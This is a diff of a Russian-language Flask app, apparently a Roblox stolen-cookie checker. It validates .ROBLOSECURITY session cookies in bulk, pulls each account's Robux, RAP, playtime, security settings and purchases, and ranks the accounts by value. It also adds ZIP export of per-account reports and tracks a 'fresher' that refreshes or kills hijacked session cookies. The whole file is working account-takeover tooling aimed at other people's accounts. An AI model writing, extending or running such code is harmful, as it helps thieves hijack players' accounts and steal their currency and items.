@@ -4,10 +4,12 @@ import logging
 import re
 import urllib3
 import json
+import io
+import zipfile
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify, send_from_directory
+from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file
 
 # ==========================================
 # ИНИЦИАЛИЗАЦИЯ И НАСТРОЙКИ
@@ -44,7 +46,9 @@ def add_checker_history(entry):
         'type': entry.get('type','single'),
         'total': entry.get('total',1),
         'valid': entry.get('valid',0),
-        'results': entry.get('results', [])
+        'usernames': entry.get('usernames', []),
+        'results': entry.get('results', []),
+        'full_reports': entry.get('full_reports', [])
     })
     if len(h) > 50: h = h[-50:]
     save_history(CHECKER_HISTORY_FILE, h)
@@ -55,13 +59,14 @@ def add_fresher_history(entry):
         'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
         'mode': entry.get('mode','duplicate'),
         'refreshed_count': entry.get('refreshed_count',0),
+        'usernames': entry.get('usernames', []),
         'cookies': entry.get('cookies', [])
     })
     if len(h) > 50: h = h[-50:]
     save_history(FRESHER_HISTORY_FILE, h)
 
 # ==========================================
-# БЛОК: ЧЕКЕР
+# БЛОК: ЧЕКЕР И АНАЛИТИКА (RAP, PLAYTIME)
 # ==========================================
 def extract_cookies_from_text(text):
     cookies = []
@@ -80,8 +85,35 @@ def extract_cookies_from_text(text):
         if c not in seen: seen.add(c); unique.append(c)
     return unique
 
+def get_user_rap(session, user_id):
+    try:
+        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
+        r = session.get(url, timeout=10, verify=False)
+        if r.status_code == 200:
+            data = r.json().get('data', [])
+            return sum(item.get('recentAveragePrice', 0) for item in data)
+    except: pass
+    return 0
+
+def get_user_playtime(session, user_id):
+    try:
+        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
+        r = session.get(url, timeout=10, verify=False)
+        if r.status_code == 200:
+            data = r.json()
+            seconds = data.get('totalPlayTimeSeconds', 0)
+            return round(seconds / 3600, 1)
+    except: pass
+    return 0
+
 def get_full_info(cookie):
-    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
+    info = {
+        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP':0, 'PlaytimeHours':0,
+        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
+        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
+        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
+        'IsPremium':False, 'DonationTotal':0
+    }
     try:
         c = cookie.strip()
         if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
@@ -93,28 +125,38 @@ def get_full_info(cookie):
         if 'id' not in d: return info
         info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
         uid = info['UserID']
+
         def g(url):
             try:
                 r = s.get(url, verify=False, timeout=10)
                 return r.json() if r.status_code == 200 else {}
             except: return {}
+
         sd = g('https://www.roblox.com/my/settings/json')
         if sd:
             sec = sd.get('MyAccountSecurityModel',{})
             info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
             info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
+        
         pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
         if pm and pm.get('isSubscribed'): info['IsPremium'] = True
+
         rd = g(f'https://users.roblox.com/v1/users/{uid}')
         if rd:
             try:
                 dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                 info['Created'] = dt.strftime('%d.%m.%Y')
             except: pass
+
         rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
         if rb: info['Robux'] = rb.get('robux',0)
+        
+        info['RAP'] = get_user_rap(s, uid)
+        info['PlaytimeHours'] = get_user_playtime(s, uid)
+
         ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
         if ct: info['Country'] = ct.get('countryCode','?')
+
         try:
             total = 0; gp_dict = {}; cursor = ""; page = 0
             while page < 5:
@@ -135,6 +177,7 @@ def get_full_info(cookie):
                 page += 1; time.sleep(0.1)
             info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
         except: pass
+
         sc = 0
         if info['EmailSet']: sc += 1
         if info['TwoFactorEnabled']: sc += 2
@@ -145,54 +188,34 @@ def get_full_info(cookie):
     return info
 
 def quick_validate(cookie):
-    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
-    try:
-        c = cookie.strip()
-        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
-        s = requests.Session()
-        s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
-        if r.status_code == 200:
-            d = r.json()
-            if 'id' in d:
-                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
-                uid = result['user_id']
-                try:
-                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
-                except: pass
-                try:
-                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if rd.status_code == 200:
-                        cr = rd.json().get('created','')
-                        if cr:
-                            result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
-                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
-                except: pass
-                try:
-                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
-                except: pass
-                try:
-                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
-                    if st.status_code == 200:
-                        sec = st.json().get('MyAccountSecurityModel',{})
-                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
-                except: pass
-                score = 0
-                if result['robux'] >= 10000: score += 100
-                elif result['robux'] >= 1000: score += 50
-                elif result['robux'] >= 100: score += 25
-                elif result['robux'] > 0: score += 10
-                if result['is_premium']: score += 50
-                if result['has_email']: score += 15
-                if result['has_2fa']: score += 10
-                if result['created_ts'] > 0:
-                    age = (datetime.now().timestamp() - result['created_ts']) / 86400
-                    if age > 365*3: score += 30
-                    elif age > 365: score += 20
-                result['score'] = score
-    except: pass
+    result = {
+        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap':0, 'playtime':0,
+        'created':'?', 'created_ts':0, 'is_premium':False, 'has_email':False, 'has_2fa':False,
+        'cookie':cookie, 'score':0, 'full_info': None
+    }
+    info = get_full_info(cookie)
+    if info['status'] == '✅':
+        result['status'] = '✅'
+        result['username'] = info['Username']
+        result['user_id'] = info['UserID']
+        result['robux'] = info['Robux']
+        result['rap'] = info['RAP']
+        result['playtime'] = info['PlaytimeHours']
+        result['created'] = info['Created']
+        result['is_premium'] = info['IsPremium']
+        result['has_email'] = info['EmailSet']
+        result['has_2fa'] = info['TwoFactorEnabled']
+        result['full_info'] = info
+        
+        score = 0
+        if info['Robux'] >= 10000: score += 100
+        elif info['Robux'] >= 1000: score += 50
+        elif info['Robux'] > 0: score += 10
+        if info['RAP'] > 5000: score += 50
+        if info['IsPremium']: score += 50
+        if info['EmailSet']: score += 15
+        if info['TwoFactorEnabled']: score += 10
+        result['score'] = score
     return result
 
 def mass_check(cookies_list):
@@ -201,7 +224,7 @@ def mass_check(cookies_list):
         futures = {ex.submit(quick_validate, c): c for c in cookies_list}
         for f in as_completed(futures):
             try: results.append(f.result())
-            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
+            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':0,'playtime':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
     valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
     valid.sort(key=lambda x: x['score'], reverse=True)
     return valid + invalid
@@ -210,8 +233,8 @@ def format_full_report(info):
     if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
     gp = info.get('PurchasedGamepasses',{})
     r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
-    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
-    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
+    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: ⏣ {info['RAP']:,} | ⏱️ Плейтайм: {info['PlaytimeHours']} ч.\n"
+    r += f"💸 Донат: ⏣ {info['DonationTotal']:,} | ⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
     r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
     if gp:
         r += "📦 ГЕЙМПАССЫ:\n"
@@ -223,11 +246,11 @@ def format_full_report(info):
 def format_quick_report(result):
     if result['status'] == '✅':
         score = result.get('score',0)
-        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
+        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
         badges = []
         if result.get('is_premium'): badges.append("💠")
         if result.get('has_2fa'): badges.append("🔐")
-        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}\n🍪 {result['cookie']}"
+        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} (RAP: {result['rap']:,}) | {result['playtime']}h | S:{score} {' '.join(badges)}\n🍪 {result['cookie']}"
     return f"❌ НЕВАЛИД | {result['cookie']}"
 
 # ==========================================
@@ -500,15 +523,6 @@ HTML = r"""<!DOCTYPE html>
             transform: scale(1.03);
         }
 
-        .ripple {
-            position: absolute; border-radius: 50%;
-            transform: scale(0); animation: ripple-anim 0.6s linear;
-            background: rgba(255, 255, 255, 0.4); pointer-events: none;
-        }
-        @keyframes ripple-anim {
-            to { transform: scale(4); opacity: 0; }
-        }
-
         textarea, input[type="number"], input[type="text"] {
             width: 100%; padding: 14px;
             background: var(--input-bg);
@@ -568,7 +582,7 @@ HTML = r"""<!DOCTYPE html>
             border-color: var(--accent-pink);
         }
 
-        .btn-download-txt {
+        .btn-download-txt, .btn-download-zip {
             background: rgba(217, 70, 239, 0.15);
             border: 1px solid rgba(217, 70, 239, 0.3);
             color: var(--accent-pink);
@@ -579,7 +593,7 @@ HTML = r"""<!DOCTYPE html>
             cursor: pointer;
             transition: all 0.2s;
         }
-        .btn-download-txt:hover {
+        .btn-download-txt:hover, .btn-download-zip:hover {
             background: rgba(217, 70, 239, 0.3);
             box-shadow: 0 0 10px var(--accent-glow);
         }
@@ -621,6 +635,9 @@ HTML = r"""<!DOCTYPE html>
             display: flex; justify-content: space-between; align-items: center;
             font-size: 13px; font-weight: 700; color: var(--accent-pink);
             flex-wrap: wrap; gap: 8px;
+        }
+        .history-users {
+            font-size: 11px; color: var(--text-main); margin-top: 4px; font-weight: 600;
         }
         
         .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
@@ -690,6 +707,7 @@ HTML = r"""<!DOCTYPE html>
                     <div class="result-header">
                         <span class="result-title">РЕЗУЛЬТАТЫ ЧЕКА:</span>
                         <div class="action-btn-group">
+                            <button class="btn-download-zip" onclick="downloadMassZip()">📦 Скачать ZIP (Все аккаунты)</button>
                             <button class="btn-download-txt" onclick="downloadTxtFromBox('massResult', 'mass_report.txt')">📥 Скачать TXT</button>
                             <button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button>
                         </div>
@@ -763,34 +781,27 @@ HTML = r"""<!DOCTYPE html>
 </div>
 
 <script>
-// --- АНИМАЦИЯ ЧАСТИЦ ФОНА ---
+// --- АНИМАЦИЯ ЧАСТИЦ ---
 const canvas = document.getElementById('particles-canvas');
 const ctx = canvas.getContext('2d');
 let particles = [];
-
 function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
 window.addEventListener('resize', resizeCanvas);
 resizeCanvas();
 
 for(let i=0; i<40; i++) {
     particles.push({
-        x: Math.random() * canvas.width,
-        y: Math.random() * canvas.height,
-        r: Math.random() * 2 + 1,
-        dx: (Math.random() - 0.5) * 0.5,
-        dy: (Math.random() - 0.5) * 0.5,
+        x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+        r: Math.random() * 2 + 1, dx: (Math.random() - 0.5) * 0.5, dy: (Math.random() - 0.5) * 0.5,
         alpha: Math.random() * 0.5 + 0.2
     });
 }
-
 function animateParticles() {
     ctx.clearRect(0,0,canvas.width,canvas.height);
     particles.forEach(p => {
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
         ctx.fillStyle = `rgba(217, 70, 239, ${p.alpha})`;
-        ctx.shadowBlur = 10; ctx.shadowColor = '#a855f7';
-        ctx.fill();
+        ctx.shadowBlur = 10; ctx.shadowColor = '#a855f7'; ctx.fill();
         p.x += p.dx; p.y += p.dy;
         if(p.x<0 || p.x>canvas.width) p.dx *= -1;
         if(p.y<0 || p.y>canvas.height) p.dy *= -1;
@@ -799,48 +810,23 @@ function animateParticles() {
 }
 animateParticles();
 
-// --- RIPPLE ЭФФЕКТ ---
-document.addEventListener('click', function(e) {
-    if (e.target.classList.contains('btn')) {
-        const btn = e.target;
-        const circle = document.createElement('span');
-        const diameter = Math.max(btn.clientWidth, btn.clientHeight);
-        const radius = diameter / 2;
-        circle.style.width = circle.style.height = `${diameter}px`;
-        circle.style.left = `${e.clientX - btn.getBoundingClientRect().left - radius}px`;
-        circle.style.top = `${e.clientY - btn.getBoundingClientRect().top - radius}px`;
-        circle.classList.add('ripple');
-        const ripple = btn.getElementsByClassName('ripple')[0];
-        if (ripple) ripple.remove();
-        btn.appendChild(circle);
-    }
-});
-
-// --- ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК С СОХРАНЕНИЕМ СОСТОЯНИЯ ---
+// --- ВЛАДКИИ ---
 function activateTab(tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-    
     const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
     const targetContent = document.getElementById('tab-' + tabName);
-    
     if(targetBtn && targetContent) {
-        targetBtn.classList.add('active');
-        targetContent.classList.add('active');
+        targetBtn.classList.add('active'); targetContent.classList.add('active');
         localStorage.setItem('kai_active_tab', tabName);
         if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
     }
 }
-
 document.querySelectorAll('.tab').forEach(tab => {
-    tab.addEventListener('click', function() {
-        activateTab(this.dataset.tab);
-    });
+    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
 });
-
 window.addEventListener('DOMContentLoaded', () => {
-    const savedTab = localStorage.getItem('kai_active_tab') || 'checker';
-    activateTab(savedTab);
+    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
 });
 
 function toggleTheme() {
@@ -848,12 +834,10 @@ function toggleTheme() {
     html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
 }
 
-// --- УНИВЕРСАЛЬНОЕ СВОРАЧИВАНИЕ / РАЗВОРАЧИВАНИЕ ---
 function toggleBox(boxId) {
     const box = document.getElementById(boxId);
     const btn = document.getElementById('btnToggle_' + boxId);
     if (!box) return;
-    
     if (box.style.display === 'none') {
         box.style.display = 'block';
         if (btn) btn.textContent = '▼ Свернуть';
@@ -863,23 +847,18 @@ function toggleBox(boxId) {
     }
 }
 
-// --- СКАЧИВАНИЕ ТЕКСТА В TXT ФАЙЛ ---
 function downloadTxtFromBox(boxId, defaultFilename = 'report.txt') {
     const box = document.getElementById(boxId);
     if (!box || !box.textContent.trim()) return alert('Нет данных для скачивания!');
-    
     const blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
-    a.href = url;
-    a.download = defaultFilename;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    a.href = url; a.download = defaultFilename;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
     URL.revokeObjectURL(url);
 }
 
-// --- ДРАГ-Н-ДРОП ---
+// --- ДРАГ И ДРОП ---
 const dropArea = document.getElementById('massDropArea');
 ['dragenter', 'dragover'].forEach(e => dropArea.addEventListener(e, prev => prev.preventDefault()));
 dropArea.addEventListener('drop', e => {
@@ -894,6 +873,8 @@ document.getElementById('massFile').addEventListener('change', function() {
 });
 
 // --- API ЛОГИКА ---
+let lastMassReports = [];
+
 async function runSingleCheck() {
     const cookie = document.getElementById('singleCookie').value.trim();
     if(!cookie) return alert('Вставьте кук!');
@@ -915,7 +896,7 @@ async function runMassCheck() {
     document.getElementById('massResult').style.display = 'block';
     document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
     document.getElementById('massProgress').style.width = '50%';
-    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';
+    document.getElementById('massResult').textContent = '⏳ Массовая проверка... (RAP, Playtime, Full Analysis)';
     
     const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
     const data = await res.json();
@@ -923,11 +904,26 @@ async function runMassCheck() {
     setTimeout(() => document.getElementById('massProgress').style.width = '0%', 1000);
     
     if(data.success) {
+        lastMassReports = data.full_reports || [];
         document.getElementById('statValid').textContent = data.valid_count;
         document.getElementById('statRobux').textContent = data.total_robux.toLocaleString();
         document.getElementById('statPremium').textContent = data.premium_count;
         document.getElementById('massResult').textContent = data.results.join('\n\n');
     }
+}
+
+async function downloadMassZip() {
+    if (!lastMassReports.length) return alert('Нет готовых отчетов!');
+    const res = await fetch('/api/download-zip', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({reports: lastMassReports})
+    });
+    const blob = await res.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = 'accounts_reports.zip';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
 }
 
 function setFresherMode(m) {
@@ -952,13 +948,14 @@ async function runFresher() {
     document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
 }
 
-// --- ВЫВОД ИСТОРИИ (ПО УМОЛЧАНИЮ СВЕРНУТА, C ВОЗМОЖНОСТЬЮ РАЗВЕРНУТЬ И СКАЧАТЬ) ---
+// --- ИСТОРИЯ ---
 async function loadCheckerHistory() {
     const res = await fetch('/api/history/checker');
     const data = await res.json();
     let html = '';
     data.history.slice().reverse().forEach((i, idx) => {
         const resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
+        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
         const boxId = `chk_hist_${idx}`;
         const fileName = `checker_history_${i.timestamp.replace(/[:. ]/g, '_')}.txt`;
         html += `
@@ -970,6 +967,7 @@ async function loadCheckerHistory() {
                     <button class="btn-toggle-box" id="btnToggle_${boxId}" onclick="toggleBox('${boxId}')">▶ Развернуть</button>
                 </div>
             </div>
+            <div class="history-users">👤 Аккаунты: ${usernames}</div>
             <div class="result-box" id="${boxId}" style="display:none;">${resultsText}</div>
         </div>`;
     });
@@ -982,6 +980,7 @@ async function loadFresherHistory() {
     let html = '';
     data.history.slice().reverse().forEach((i, idx) => {
         const cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
+        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
         const boxId = `frs_hist_${idx}`;
         const modeTitle = i.mode === 'kill' ? '💀 Убийство куки' : '♻️ Дублирование';
         const fileName = `fresher_history_${i.timestamp.replace(/[:. ]/g, '_')}.txt`;
@@ -994,6 +993,7 @@ async function loadFresherHistory() {
                     <button class="btn-toggle-box" id="btnToggle_${boxId}" onclick="toggleBox('${boxId}')">▶ Развернуть</button>
                 </div>
             </div>
+            <div class="history-users">👤 Аккаунты: ${usernames}</div>
             <div class="result-box" id="${boxId}" style="display:none;">${cookiesText}</div>
         </div>`;
     });
@@ -1041,7 +1041,12 @@ def api_single_check():
     if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
     info = get_full_info(cookie)
     report = format_full_report(info)
-    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'results': [report]})
+    add_checker_history({
+        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
+        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
+        'results': [report],
+        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
+    })
     return jsonify({"success": True, "report": report})
 
 @app.route("/api/mass-check", methods=["POST"])
@@ -1054,11 +1059,46 @@ def api_mass_check():
     results = mass_check(cookies)
     valid = [r for r in results if r['status']=='✅']
     formatted = [format_quick_report(r) for r in results]
+    
+    full_reports = []
+    usernames = []
+    for r in valid:
+        if r.get('full_info'):
+            full_reports.append({
+                'username': r['username'],
+                'user_id': r['user_id'],
+                'report': format_full_report(r['full_info'])
+            })
+            usernames.append(r['username'])
+            
     premium_count = sum(1 for r in valid if r.get('is_premium'))
     total_robux = sum(r.get('robux',0) for r in valid)
     
-    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'results': formatted})
-    return jsonify({"success": True, "valid_count": len(valid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted})
+    add_checker_history({
+        'type': 'mass', 'total': len(results), 'valid': len(valid),
+        'usernames': usernames,
+        'results': formatted,
+        'full_reports': full_reports
+    })
+    return jsonify({
+        "success": True, "valid_count": len(valid), "premium_count": premium_count,
+        "total_robux": total_robux, "results": formatted, "full_reports": full_reports
+    })
+
+@app.route("/api/download-zip", methods=["POST"])
+def api_download_zip():
+    data = request.json or {}
+    reports = data.get("reports", [])
+    if not reports: return jsonify({"success": False, "message": "Нет отчетов"})
+    
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
+        for r in reports:
+            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
+            zf.writestr(fname, r.get('report',''))
+            
+    zip_buffer.seek(0)
+    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")
 
 @app.route("/api/fresher", methods=["POST"])
 def api_fresher():
@@ -1069,14 +1109,16 @@ def api_fresher():
     if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
     
     only_cookies = []
+    usernames = []
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
         for f in as_completed(futures):
             res = f.result()
             if res['success'] and res['new_cookie']:
                 only_cookies.append(res['new_cookie'])
+                usernames.append(res.get('username','?'))
     
-    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': only_cookies})
+    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
     return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})
 
 @app.route("/api/history/checker")
